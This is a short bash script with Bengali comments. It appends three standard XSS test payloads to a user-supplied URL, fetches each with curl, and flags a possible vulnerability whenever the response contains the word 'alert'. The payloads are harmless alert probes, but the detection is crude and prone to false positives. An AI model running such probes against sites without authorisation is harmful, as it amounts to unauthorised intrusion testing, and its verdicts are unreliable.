#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for XSS Test (e.g., http://example.com/search?q=):"
read URL

# XSS ইনজেকশন প্যারামিটার
XSS_PAYLOADS=("<script>alert('XSS')</script>" "<img src='x' onerror='alert(1)'>" "<body onload=alert('XSS')>")

for payload in "${XSS_PAYLOADS[@]}"
do
    # প্রতিটি প্যারামিটার দিয়ে টেস্ট করা
    TEST_URL="${URL}${payload}"
    RESPONSE=$(curl -s $TEST_URL)

    # যদি XSS পে লোডটি পেজে প্রদর্শিত হয়, তা হলে XSS ভ্যালনারেবিলিটি থাকতে পারে
    if echo $RESPONSE | grep -q "alert"; then
        echo "[+] Potential XSS vulnerability detected with payload: $payload"
    else
        echo "[-] No vulnerability detected with payload: $payload"
    fi
done
